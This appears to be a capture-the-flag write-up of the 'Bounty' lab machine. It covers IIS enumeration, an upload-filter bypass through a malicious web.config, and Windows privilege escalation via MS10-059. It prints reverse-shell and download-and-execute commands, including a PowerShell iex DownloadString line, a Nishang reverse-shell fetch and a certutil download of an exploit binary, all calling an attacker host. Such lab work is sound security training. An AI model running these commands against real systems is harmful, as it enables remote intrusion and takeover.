# About
Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches. 
## Skills Required
● Basic knowledge of VBScript or C#, VB.NET
## Skills Learned
● web.config payload creation
● Identification of missing security patches
● Exploit selection and execution
## Enumeration
`nmap -A -T4 -p- 10.129.30.81`
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
```
Looking at the responses from the server in burb shows us this site is most likely running ASP

![](Images/Pasted%20image%2020250417104923.png)

So we can tie that into our enumeration for Fuzzing
`ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.30.81:80/FUZZ`

![](Images/Pasted%20image%2020250417105236.png)

`ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.30.81:80/FUZZ.aspx
`
![](Images/Pasted%20image%2020250417105255.png)

![](Images/Pasted%20image%2020250417105749.png)

## Exploit

The transfer file appears to be a file upload and the files are sent to the uploaded files. Lets first see if we can get a simple aspx webshell. It ends up erroring out which probably means we have some sort of filtering on the upload

![](Images/Pasted%20image%2020250417105828.png)

Lets see if we can modify the request to test extensions using intruder.
Nothing seemed to have gotten really anywhere with the basic, but I was using a bad payload. The website allows uploads of jpg files.

![](Images/Pasted%20image%2020250417111109.png)

![](Images/Pasted%20image%2020250417110545.png)

![](Images/Pasted%20image%2020250417111140.png)

Using this we can attempt to trick the filter into letting us through with methods such as double extensions.

![](Images/Pasted%20image%2020250417110707.png)
![](Images/Pasted%20image%2020250417110713.png)

Navigating to cmdasp.aspx.jpg didn't get us execution, so maybe we need to use a nullbyte in order to store it as a aspx file while passing the whitelist as jpg. 

![](Images/Pasted%20image%2020250417111533.png)

Since that didn't work I went back to enumerating and found a list of asp extensions and used that for intruder, and made sure to disable URL encoding.

![](Images/Pasted%20image%2020250417112714.png)

We find another allowed upload is a .config file.
Upon a quick google search we find ASP.NET config file is web.config. [Web.Config Reverse Shell](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config)
We will have to do some modifications to this to get a shell.
`wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 > shell.ps1`
We will need to add the commands to run the reverse shell.
`echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.251 -Port 4444' >> shell.ps1`
the config file will not look like this
`obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.251/shell.ps1')")`
If everything goes right we pop a shell as user merlin

![](Images/Pasted%20image%2020250417115051.png)

Grab the user flag and keep moving forward.

![](Images/Pasted%20image%2020250417115409.png)

## Priv Esc
Sysinfo
```
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          4/17/2025, 5:26:39 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,472 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,486 MB
Virtual Memory: In Use:    609 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.30.81
                                 [02]: fe80::e518:9b96:337f:8fe3
                                 [03]: dead:beef::e518:9b96:337f:8fe3

```
`python2 exploit-suggester.py --database 2025-04-16-mssb.xls --systeminfo sysinfo.txt`
```
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

**MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important**

![](Images/Pasted%20image%2020250417120256.png)

`certutil -urlcache -split -f http://10.10.14.251:8080/exploit.exe exploit.exe`

![](Images/Pasted%20image%2020250417120429.png)

`.\exploit.exe 10.10.14.251 4445`

![](Images/Pasted%20image%2020250417120716.png)

![](Images/Pasted%20image%2020250417120723.png)
